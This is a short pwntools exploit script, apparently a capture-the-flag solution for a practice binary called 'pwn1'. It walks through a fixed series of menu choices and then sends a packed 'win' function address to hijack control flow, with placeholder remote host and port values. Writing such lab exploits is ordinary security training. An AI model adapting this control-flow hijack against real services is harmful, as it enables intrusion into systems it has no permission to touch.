#!/usr/bin/env python3
from pwn import *

PORT = 0000
HOST = "000000000"
exe = context.binary = ELF('./pwn1', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

#GDB()

win = 0x08049CB5

def choice(idx):
	p.sendlineafter(b"\n", str(idx))

choice(2)
choice(2)
choice(1)
for i in range(4):
	choice(3)
	choice(3)
	choice(2)

p.sendlineafter(b"\n", p64(win))

p.interactive()